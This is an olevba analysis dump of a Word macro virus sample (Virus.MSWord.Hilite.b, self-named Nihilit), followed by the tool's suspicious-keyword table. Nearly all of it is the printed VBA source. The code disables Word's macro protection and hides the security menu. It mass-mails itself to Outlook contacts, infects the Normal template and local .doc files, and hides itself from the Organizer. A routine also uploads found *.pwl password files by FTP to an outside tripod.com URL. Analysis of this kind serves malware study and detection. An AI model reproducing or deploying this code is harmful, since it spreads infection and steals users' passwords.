olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hilite.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hilite.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Hilite.b - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub AutoClose()
    On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
' Nihilit v2.0 by Necronomikon |[ShadowvX],[Devilport-Systems]
' based on Jackal by WalruS
    Call Nihilit
End Sub
Sub Nihilit()
    On Error Resume Next
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents("Nihilit").Export ("C:\Windows\Nihilit.drv")
    SetAttr "C:\Windows\Nihilit.drv", 6
    End If
    ActiveDocument.SaveAs FileName:="C:\Windows\Nihilit.doc", FileFormat:=wdFormatDocument
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    Next
    If Ni_AddList.AddressEntries.Count <> 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Next
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I like this story!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To <> "" Then
    Ni_msg.Send
    End If
    Call InfectDocument
    If Month(Now) = Day(Now) Then Call Pwdstealer
    NormalTemplate.Saved = True
    End If
End Sub

Sub InfectDocument()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Nihilit.drv")
    ActiveDocument.Save
    End If
End Sub

Sub Pwdstealer()
    On Error Resume Next
    With Application.FileSearch
.FileName = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
shell "ftp http://members.tripod.com/Nihilit/"
shell "nihilit"
shell "killer"
shell "post" & .FoundFiles(i)
shell "bye"
Next i
End With
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

Sub FileTemplates()
End Sub

Sub ToolsMacro()
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
End Sub

Sub ViewVBCode()
    Call Stealth
    ShowVisualBasicEditor = True
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub
Sub HelpAbout()
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit was coded by Necronomikon."
End Sub
Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Nihilit
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://members.tripo|URL                                          |
|          |d.com/Nihilit/      |                                             |
|IOC       |winmm.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

